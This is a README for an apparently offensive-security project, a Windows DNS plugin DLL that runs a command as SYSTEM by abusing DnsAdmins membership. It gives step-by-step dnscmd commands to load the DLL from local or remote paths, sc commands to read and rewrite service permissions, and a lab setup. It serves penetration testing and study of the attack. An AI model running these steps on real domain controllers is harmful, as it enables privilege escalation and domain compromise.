# DNSAdmin DLL

This project is a small implementation of a Windows DNS server
plugin DLL to allow executing a command as local system. For the
original work, please see [Shay Ber's 2017 article][shay] and
a practical guide on [ired.team][ired] that explains how to
implement the attack.

## What is in it

This repo contains a single Visual Studio 2017 project that 
exports the 3 required functions for the DLL to be accepted
by `dns.exe`.

When the `DnsPluginInitialize` is called by the DNS service
during service startup (running as local system), it will 
attempt to read `c:\windows\temp\command.txt`. The contents
of this file will be passed verbatim to [`system`][system].

## Typical usage

Please read the [original work][shay] first to get an idea
of how it functions.

It is assumed that the below is executed from a user account
that is a member of [`DnsAdmins`][dnsadmins] in an AD
environment.


1. Specify the command to be exeucted on the dns server:
    ```
   echo "ping 1.2.3.4" > c:\windows\temp\command.txt
   ```
    It is possible to change this path, e.g. to a remote source
    if needed in the code.
2. Configure the plugin to run when the server is started:
   a. local path
      ```
      dnscmd.exe /config /serverlevelplugindll c:\path\to\DNSAdmin-DLL.dll
      ```
   b. remote path
      ```
      dnscmd.exe /config /serverlevelplugindll \\1.2.3.4\share\DNSAdmin-DLL.dll
      ```
3. Wait for the dns service to restart. In a default
   configuration, members of the `DnsAdmins` group do not have
   special access to start/stop the dns service.

   Probably the easiest way to confirm which user has access is
   to try (if you have enough permissions) reading the SDDL of
   the service as follows:
    ```
    sc sdshow dns
    ```
   [woshub.com][sdshow] has some useful information on decoding
   the result. Essentially, you need to look for a discressionary
   access control entry for an account you have access to and
   has `RP` - start service and `WP` - stop service permissions.

When the command is executed with `system` it will block the
calling thread until the underlying process is completed. However,
the DNS server appears to remain functional and answer queries.
For this reason, the code does not attempt to create its own
thread before executing `system`.

## Lab environment

To setup a minimal lab:

1. Setup a Windows 2016 PDC with a single user, see 
   [here][win2016core] for using a good guide to do this on a
   core install.
2. Add user to `DnsAdmin` AD group. (e.g. 
   `Add-ADGroupMember DnsAdmins`) 
3. Configure dns server service acl:
   a. Read SDDL of service
      ```
      > sc sdshow dns
      D:(A;;CCLCSWRPWPDTLOCRRC;;;SY)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;BA)(A;;CCLCSWLOCRRC;;;IU)(A;;CCLCSWLOCRRC;;;SU)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;SO)S:(AU;FA;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;WD)
      ```
   b. Find SID of `DnsAdmins` (e.g. `Get-ADGroup`)
   c. Write SDDL of service by inserting the following access
      control entry (after updating the SID):
      ```
      (A;;CCLCRPWP;;;S-1-5-21-700907644-1504022619-419926652-1101)
      ```
      This will grant `CC`, `LC`, `RP` and `WP` which correlate
      to `sc` commands: `qc`, `query`, `start`, `stop`.

      So the command would be:
      ```
      sc setsd "D:(A;;CCLCSWRPWPDTLOCRRC;;;SY)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;BA)(A;;CCLCSWLOCRRC;;;IU)(A;;CCLCSWLOCRRC;;;SU)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;SO)(A;;CCLCRPWP;;;S-1-5-21-700907644-1504022619-419926652-1101)S:(AU;FA;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;WD)"
      ```

## Other bits

Copyright Karim Kanso, 2019. All rights reserved. Licenced under GPLv3.

[shay]: https://medium.com/@esnesenon/feature-not-bug-dnsadmin-to-dc-compromise-in-one-line-a0f779b8dc83 "Feature, not bug: DNSAdmin to DC compromise in one line"
[ired]: https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/from-dnsadmins-to-system-to-domain-compromise "From DnsAdmins to SYSTEM to Domain Compromise"
[system]: https://docs.microsoft.com/en-us/cpp/c-runtime-library/reference/system-wsystem "system, _wsystem | Microsoft Docs"
[dnsadmins]: https://docs.microsoft.com/en-us/windows/security/identity-protection/access-control/active-directory-security-groups#bkmk-dnsadmins "Active Directory Security Groups"
[sdshow]: http://woshub.com/set-permissions-on-windows-service/ "How to Allow Non-Admin Users to Start/Stop Windows Service"
[win2016core]: https://medium.com/@rootsecdev/how-to-build-a-server-2016-domain-controller-non-gui-and-make-it-secure-4e784b393bac "How to build a server 2016 domain controller (Non-GUI) and make it secure"